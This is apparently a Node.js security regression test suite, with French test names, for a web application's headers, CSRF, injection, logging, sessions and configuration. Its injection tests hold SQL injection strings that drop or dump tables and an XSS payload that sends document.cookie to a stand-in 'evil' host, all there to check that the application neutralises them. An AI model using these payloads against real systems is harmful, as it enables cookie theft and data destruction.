/**
 * Security regression suite.
 *
 * Each test corresponds to a class of vulnerability listed in the audit scope:
 * CSRF, XSS, SQL injection, secret leakage, clickjacking, session handling,
 * brute force, error verbosity, upload handling (see files.test.js), SSRF
 * (see url.test.js).
 */
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, before, describe, it } from 'node:test';
import { boot } from './helpers.js';
import { redact } from '../src/utils/logger.js';
import { loadDotenv, parseDotenv } from '../src/config/dotenv.js';
import { addLogSink } from '../src/utils/logger.js';

const ADMIN = { id: 'admin@test.local', password: 'Sup3r-Secret-Initial!' };
const USER = { id: 'alice@test.local', password: 'User-Standard-2026!' };

describe('en-têtes et protection navigateur', () => {
  let ctx;
  before(async () => {
    ctx = await boot();
  });
  after(async () => {
    await ctx.close();
  });

  it('sert l’API avec des en-têtes de durcissement', async () => {
    const res = await ctx.client().get('/api/meta');
    assert.equal(res.status, 200);
    const h = res.headers;
    assert.equal(h.get('x-content-type-options'), 'nosniff');
    assert.equal(h.get('x-frame-options'), 'DENY');
    assert.equal(h.get('referrer-policy'), 'no-referrer');
    assert.equal(h.get('cross-origin-opener-policy'), 'same-origin');
    assert.equal(h.get('permissions-policy'), 'geolocation=(), microphone=(), camera=(), interest-cohort=(), browsing-topics=()');
    assert.equal(h.get('x-powered-by'), null, 'X-Powered-By retiré');
    const csp = h.get('content-security-policy');
    assert.ok(csp, 'CSP présent');
    assert.match(csp, /default-src 'self'/);
    assert.match(csp, /frame-ancestors 'none'/);
    assert.match(csp, /base-uri 'none'/);
    assert.match(csp, /object-src 'none'/);
    assert.ok(!/script-src[^;]*unsafe-inline/.test(csp), 'pas de unsafe-inline pour les scripts');
    assert.equal(h.get('cache-control'), 'no-store, max-age=0', 'les réponses API ne sont jamais mises en cache');
  });

  it('n’utilise jamais __Host- sans Secure et le fait avec Secure', async () => {
    const res = await ctx.client().post('/api/auth/login', ADMIN);
    const setCookies = res.headers.getSetCookie().join('\n');
    // En test, COOKIE_SECURE n’est pas forcé : pas de préfixe __Host-.
    assert.equal(ctx.config.cookies.secure, false);
    assert.ok(!setCookies.includes('__Host-'), 'préfixe réservé au HTTPS');
  });

  it('refuse une écriture authentifiée sans jeton CSRF', async () => {
    const c = ctx.client();
    await c.login(ADMIN.id, ADMIN.password);
    const csrf = c.getCsrf();
    c.setCsrf(null);
    const without = await c.post('/api/agents/tasks', { title: 'sans jeton', agentRole: 'qa' });
    assert.equal(without.status, 403);
    assert.equal(without.body.error.code, 'CSRF_FAILURE');

    c.setCsrf('mauvais-jeton');
    const wrong = await c.post('/api/agents/tasks', { title: 'jeton invalide', agentRole: 'qa' });
    assert.equal(wrong.status, 403, 'un jeton inventé ne suffit pas');

    c.setCsrf(csrf);
    const good = await c.post('/api/agents/tasks', { title: 'avec jeton', agentRole: 'qa' });
    assert.equal(good.status, 201, 'le même appel passe avec le bon jeton');
  });

  it('journalise les échecs CSRF en événement de sécurité', async () => {
    const before = ctx.runtime.db.get(`SELECT count(*) AS c FROM audit_logs WHERE action='security.csrf.failure'`).c;
    const c = ctx.client();
    await c.login(ADMIN.id, ADMIN.password);
    c.setCsrf(null);
    await c.post('/api/agents/tasks', { title: 'tentative', agentRole: 'qa' });
    const after = ctx.runtime.db.get(`SELECT count(*) AS c FROM audit_logs WHERE action='security.csrf.failure'`).c;
    assert.equal(after, before + 1);
  });
});

describe('injections et fuites de données', () => {
  let ctx;
  before(async () => {
    ctx = await boot();
  });
  after(async () => {
    await ctx.close();
  });

  it('neutralise les charges utiles d’injection SQL sur les filtres', async () => {
    const c = ctx.client();
    await c.login(ADMIN.id, ADMIN.password);
    const payloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "1 UNION SELECT id, password_hash FROM users --",
      "admin'--",
      "\"; DELETE FROM audit_logs;\"",
    ];
    for (const p of payloads) {
      const res = await c.get(`/api/users?q=${encodeURIComponent(p)}&status=${encodeURIComponent(p)}`);
      assert.equal(res.status, 200, `la recherche doit rester une simple chaîne: ${p}`);
      assert.equal(res.body.total, 0, `aucune ligne ne doit correspondre à ${p}`);
    }
    const still = ctx.runtime.db.get(`SELECT count(*) AS c FROM users WHERE deleted_at IS NULL`).c;
    assert.ok(still >= 2, 'les tables sont intactes');
  });

  it('neutralise l’injection dans un identifiant de session', async () => {
    const c = ctx.client();
    await c.login(ADMIN.id, ADMIN.password);
    const res = await c.del(`/api/sessions/${encodeURIComponent("' OR 1=1 --")}`);
    assert.equal(res.status, 404, 'aucune session supprimée');
    assert.ok(ctx.runtime.db.get(`SELECT count(*) AS c FROM sessions`).c >= 1);
  });

  it('traite les charges utiles XSS comme du texte simple (rendu React + échappement)', async () => {
    const c = ctx.client();
    await c.login(ADMIN.id, ADMIN.password);
    const payload = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';
    const created = await c.post('/api/users', { email: 'xss@test.local', username: 'xssuser', displayName: payload, roles: ['USER'] });
    assert.equal(created.status, 201);
    const listed = await c.get('/api/users?q=xss');
    assert.equal(listed.status, 200);
    const row = listed.body.items.find((u) => u.email === 'xss@test.local');
    assert.equal(row.displayName, payload, 'la valeur est renvoyée intacte, non exécutée');
    assert.ok(!row.displayName.includes('<script'), 'aucun script injecté dans les données');
    // L'application ne rend jamais du HTML depuis les données utilisateur : le SPA
    // utilise JSX (échappement automatique) et aucun dangerouslySetInnerHTML.
    const json = JSON.stringify(listed.body);
    assert.ok(listed.text.includes('onerror='), 'le serveur ne réécrit ni n’échappe la charge utile : c’est le rendu qui doit échapper');
    assert.ok(!(await import('node:fs')).readFileSync('src/../client/ui.jsx', 'utf8').includes('dangerouslySetInnerHTML'), 'aucun dangerouslySetInnerHTML dans l’UI');
  });

  it('ne renvoie jamais de pile, de chemin absolu ou de requête SQL dans une erreur', async () => {
    const c = ctx.client();
    await c.login(ADMIN.id, ADMIN.password);
    const cases = [
      ['GET', '/api/users/999999'],
      ['GET', '/api/files/999999'],
      ['POST', '/api/users'],
      ['POST', '/api/auth/change-password'],
    ];
    for (const [method, path] of cases) {
      const res = await c.request(method, path, { body: method === 'GET' ? undefined : {} });
      assert.ok(res.status >= 400, `${method} ${path} doit être une erreur`);
      const text = JSON.stringify(res.body);
      assert.ok(!/at .*\.js:\d+/.test(text), `pas de stack dans ${path}`);
      assert.ok(!/\/(home|root|app|usr|var)\//.test(text), `pas de chemin absolu dans ${path}`);
      assert.ok(!/SELECT|INSERT INTO|sqlite|prepare\(/i.test(text), `pas de fragment SQL dans ${path}`);
      assert.ok(!/password_hash|\$argon2/.test(text), `pas de matériau de hachage dans ${path}`);
    }
  });

  it(' masque les valeurs sensibles dans toute journalisation', () => {
    const fakeLog = [];
    const stop = addLogSink((rec) => fakeLog.push(rec));
    try {
      const probe = 'S3cr3t-De-Control-2026!';
      const out = JSON.stringify(
        redact({
          user: { email: 'a@b.c', password: probe },
          headers: { authorization: `Bearer ${probe}`, cookie: `ps_session=${probe}` },
          tokens: [probe],
          note: `le mot de passe est ${probe}`, // texte libre : non masqué, voir l’assertion ci-dessous
          url: `https://user:${probe}@internal/`,
          hash: '$argon2id$v=19$m=19456,t=3,p=2$c2FsdA$ZGln',
        }),
      );
      assert.ok(out.includes('le mot de passe est'), 'le texte libre non structuré ne peut pas être masqué — c’est au code appelant de ne pas journaliser de secret');
      assert.ok(!/\bpassword\$/.test(out) && out.includes('"password":"[REDACTED]"'), `les champs sensibles sont masqués : ${out.slice(0, 400)}`);
      assert.match(out, /\[REDACTED\]/);
      const inline = JSON.stringify(redact({ detail: `réinitialisation demandée, password=${probe} transmise` }));
      assert.ok(!inline.includes(probe), 'les paires clé=valeur dans une chaîne sont masquées');
      const query = JSON.stringify(redact({ href: `/reset?token=${probe}&x=1` }));
      assert.ok(!query.includes(probe), 'les jetons en query string sont masqués');
      assert.ok(!out.includes('$argon2id$v=19$m=19456'), 'un hash PHC est masqué');
      assert.ok(!/user:S3cr3t/.test(out), 'les identifiants d’URL sont masqués');
    } finally {
      stop();
    }
    // Le corps des requêtes d’authentification ne transite jamais par le logger.
    const leaked = fakeLog.filter((r) => JSON.stringify(r).includes('Sup3r-Secret-Initial!'));
    assert.equal(leaked.length, 0, 'aucun mot de passe dans les journaux');
  });

  it('ne renvoie ni hash ni jeton dans les endpoints publics', async () => {
    for (const p of ['/healthz', '/readyz', '/api/meta', '/api/auth/status']) {
      const res = await ctx.client().get(p);
      assert.equal(res.status, 200, `${p} doit être public`);
      const body = JSON.stringify(res.body);
      assert.ok(!/\$argon2/.test(body), `${p} ne doit pas exposer un hash`);
      assert.ok(!/ps_session|sessionToken|refreshToken/.test(body), `${p} ne doit pas exposer de jeton`);
      assert.ok(!/\/home\/|C:\\/.test(body), `${p} ne doit pas exposer de chemin`);
    }
  });
});

describe('débit, sessions et configuration', () => {
  it('applique une limite de requêtes par client (429 + Retry-After)', async () => {
    const ctx = await boot({ extraConfig: { API_RATE_LIMIT_PER_MIN: '5', AUTH_RATE_LIMIT_PER_MIN: '5' } });
    try {
      const c = ctx.client();
      const codes = [];
      for (let i = 0; i < 8; i += 1) codes.push((await c.get('/api/meta')).status);
      assert.ok(codes.slice(0, 5).every((s) => s === 200), `les 5 premières passent : ${codes}`);
      assert.ok(codes.slice(5).every((s) => s === 429), `les suivantes sont limitées : ${codes}`);
    } finally {
      await ctx.close();
    }
  });

  it('rejette une configuration dangereuse en production', async () => {
    const { loadConfig, ConfigError } = await import('../src/config/env.js');
    const base = { NODE_ENV: 'production', SESSION_SECRET: 'z'.repeat(48), STATE_SECRET: 'y'.repeat(48) };
    assert.throws(
      () => loadConfig({ ...base, COOKIE_SAMESITE: 'none', COOKIE_SECURE: '0' }),
      (err) => err instanceof ConfigError && /COOKIE_SAMESITE/.test(err.message),
      'SameSite=none sans Secure est refusé',
    );
    assert.throws(
      () => loadConfig({ ...base, CSRF_PROTECTION: '0' }),
      (err) => /CSRF_PROTECTION/.test(err.message),
      'CSRF désactivé est refusé en production',
    );
    assert.throws(
      () => loadConfig({ ...base, DISABLE_AUTH_FOR_TESTS: '1' }),
      (err) => /DISABLE_AUTH_FOR_TESTS/.test(err.message),
      'la porte de test est refusée en production',
    );
    assert.throws(
      () => loadConfig({ ...base, CORS_ALLOWED_ORIGINS: '*' }),
      (err) => /CORS_ALLOWED_ORIGINS/.test(err.message),
      'CORS * avec cookies est refusé',
    );
    assert.throws(
      () => loadConfig({ NODE_ENV: 'production', SESSION_SECRET: '', STATE_SECRET: 'short', SECRET_ALLOW_GENERATED: '0' }),
      (err) => /SESSION_SECRET|STATE_SECRET/.test(err.message),
      'un secret absent/trop court est refusé en production',
    );
    const ok = loadConfig({ ...base, COOKIE_SECURE: '1' });
    assert.equal(ok.cookies.secure, true, 'une configuration saine passe');
    assert.equal(ok.disableAuthForTests, false);
  });

  it('refuse un secret fourni mais trop faible en production (jamais de remplacement silencieux)', async () => {
    const { loadConfig } = await import('../src/config/env.js');
    const base = { NODE_ENV: 'production', HOST: '0.0.0.0' };
    const weak = { ...base, SESSION_SECRET: 'abc', STATE_SECRET: 'y'.repeat(48) };
    assert.throws(() => loadConfig(weak, {}), /trop faible en production/, 'un secret trop court fait échouer le démarrage');
    const placeholder = { ...base, SESSION_SECRET: 'A-CHANGER-MAINTENANT', STATE_SECRET: 'A-CHANGER-MAINTENANT' };
    assert.throws(() => loadConfig(placeholder, {}), /Aucun secret ne sera g|placeholder|trop faible/i, 'un placeholder ne passe pas non plus');
    const strong = { ...base, SESSION_SECRET: 's'.repeat(48), STATE_SECRET: 't'.repeat(48) };
    assert.doesNotThrow(() => loadConfig(strong, {}), 'un secret conformant démarre');
    // Génération explicite en production : opt-in assumé, documenté.
    const opted = { ...base, SECRET_ALLOW_GENERATED: '1', DATA_DIR: fs.mkdtempSync(path.join(os.tmpdir(), 'ps-prod-gen-')) };
    assert.doesNotThrow(() => loadConfig(opted, {}), 'SECRET_ALLOW_GENERATED=1 autorise la génération');
    // Sans cette option, l’absence de secret est une erreur de configuration.
    assert.throws(() => loadConfig({ ...base, DATA_DIR: fs.mkdtempSync(path.join(os.tmpdir(), 'ps-prod-nogen-')) }, {}), /SESSION_SECRET|manquant/i, 'aucune génération silencieuse par défaut');
  });

  it('bloque la maintenance mode pour les écritures non administratrices', async () => {
    const ctx = await boot();
    try {
      const admin = ctx.client();
      const user = ctx.client();
      await admin.login(ADMIN.id, ADMIN.password);
      await user.login(USER.id, USER.password);
      const on = await admin.put('/api/admin/settings', { entries: { 'maintenance.mode': 'true' } });
      assert.equal(on.status, 200, JSON.stringify(on.body));
      const blocked = await user.post('/api/agents/tasks', { title: 'pendant maintenance', agentRole: 'qa' });
      assert.equal(blocked.status, 403, 'écriture refusée hors administrateurs');
      const read = await user.get('/api/agents');
      assert.equal(read.status, 200, 'lecture conservée');
      const adminWrite = await admin.patch('/api/me', { displayName: 'Admin Test' });
      assert.equal(adminWrite.status, 200, 'les administrateurs conservent la main');
      await admin.put('/api/admin/settings', { entries: { 'maintenance.mode': 'false' } });
    } finally {
      await ctx.close();
    }
  });

  it('expire la session côté serveur à l’échéance (pas de glissement infini)', async () => {
    const ctx2 = await boot({ extraConfig: { SESSION_TTL_MINUTES: '1' } });
    try {
      const c = ctx2.client();
      const login = await c.login(ADMIN.id, ADMIN.password);
      assert.equal(login.status, 200);
      const row = ctx2.runtime.db.get(`SELECT expires_at FROM sessions ORDER BY id DESC LIMIT 1`);
      const ttl = (new Date(row.expires_at).getTime() - Date.now()) / 60000;
      assert.ok(ttl > 0.5 && ttl <= 1.05, `TTL d’environ 1 minute respecté (${ttl.toFixed(2)})`);
      ctx2.runtime.db.run(`UPDATE sessions SET expires_at = ? WHERE 1=1`, [new Date(Date.now() - 1000).toISOString()]);
      assert.equal((await c.get('/api/auth/me')).status, 401, 'session expirée refusée');
    } finally {
      await ctx2.close();
    }
  });
});

describe('transport des secrets', () => {
  let ctx;
  before(async () => {
    ctx = await boot();
  });
  after(async () => {
    await ctx.close();
  });

  it('n’émet jamais le jeton de session dans le corps d’une réponse', async () => {
    const c = ctx.client();
    const login = await c.login(ADMIN.id, ADMIN.password);
    const sessionCookie = c.jar.get('ps_session');
    assert.ok(sessionCookie);
    for (const path of ['/api/auth/me', '/api/users', '/api/admin/dashboard', '/api/sessions', '/api/admin/settings']) {
      const res = await c.get(path);
      assert.ok(!JSON.stringify(res.body).includes(sessionCookie), `${path} ne doit pas révéler le jeton de session`);
    }
  });

  it('accepte un logout même sans session valide (pas d’oracle)', async () => {
    const res = await ctx.client().post('/api/auth/logout', {});
    assert.equal(res.status, 200);
  });

  it('valide les clés de configuration connues uniquement', async () => {
    const c = ctx.client();
    await c.login(ADMIN.id, ADMIN.password);
    const bad = await c.put('/api/admin/settings', { entries: { 'security.session_ttl_minutes': '999999', 'un.known.key': 'x' } });
    assert.equal(bad.status, 200, 'la requête est traitée…');
    assert.equal(bad.body.updated.length, 0, '…mais aucune clé invalide n’est écrite');
    assert.equal(bad.body.rejected.length, 2, 'deux refus motivés');
    assert.match(bad.body.rejected[0].reason, /minimum|maximum|inconnue|valeur/);
  });
});

describe('chargement de la configuration locale (.env)', () => {
  it('ne remplace jamais une variable déjà présente dans l’environnement', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ps-env-'));
    try {
      fs.writeFileSync(path.join(dir, '.env'), 'SESSION_SECRET=depuis-le-fichier\nMAX_UPLOAD_MB=1\n# commentaire\nexport LOG_LEVEL=warn\nVIDE=\nAVEC_ESPACES="avec espaces"\nmauvaise ligne\n');
      const env = { SESSION_SECRET: 'depuis-le-processus', NODE_ENV: 'test' };
      const res = loadDotenv({ root: dir, env });
      assert.equal(env.SESSION_SECRET, 'depuis-le-processus', 'l’environnement gagne');
      assert.equal(env.MAX_UPLOAD_MB, '1', 'les autres valeurs sont appliquées');
      assert.equal(env.LOG_LEVEL, 'warn', 'le préfixe export est toléré');
      assert.equal(env.AVEC_ESPACES, 'avec espaces', 'les guillemets sont retirés');
      assert.equal(env.mauvaise, undefined, 'une ligne non conforme est ignorée');
      assert.ok(res.loaded.includes('MAX_UPLOAD_MB') && res.skipped.includes('SESSION_SECRET'));
      assert.equal(res.file, path.join(dir, '.env'));
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('refuse un lien symbolique et un chemin hors du projet', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ps-env2-'));
    try {
      const elsewhere = path.join(os.tmpdir(), `ps-env-outside-${Date.now()}`);
      fs.mkdirSync(elsewhere, { recursive: true });
      fs.writeFileSync(path.join(elsewhere, '.env'), 'SESSION_SECRET=depuis-ailleurs\n');
      fs.symlinkSync(path.join(elsewhere, '.env'), path.join(dir, '.env'));
      const env = {};
      const res = loadDotenv({ root: dir, env });
      assert.equal(res.file, null, 'le lien symbolique n’est pas lu');
      assert.ok(res.warning, 'et le motif est signalé');
      assert.equal(env.SESSION_SECRET, undefined);
      fs.rmSync(path.join(dir, '.env'));
      const res2 = loadDotenv({ root: dir, file: '../.env', env });
      assert.equal(res2.file, null, 'une remontée de chemin est refusée');
      fs.rmSync(elsewhere, { recursive: true, force: true });
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('ne journalise aucune valeur lue', () => {
    const captured = [];
    const stop = addLogSink((rec) => captured.push(JSON.stringify(rec)));
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ps-env3-'));
    try {
      fs.writeFileSync(path.join(dir, '.env'), 'SESSION_SECRET=Valeur-Secretie-Decoquee-9999\n');
      const env = {};
      loadDotenv({ root: dir, env });
      assert.equal(env.SESSION_SECRET, 'Valeur-Secretie-Decoquee-9999', 'le chargeur applique la valeur');
      assert.ok(!captured.some((c) => c.includes('Valeur-Secretie-Decoquee-9999')), 'aucune journalisation de la valeur');
    } finally {
      stop();
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});
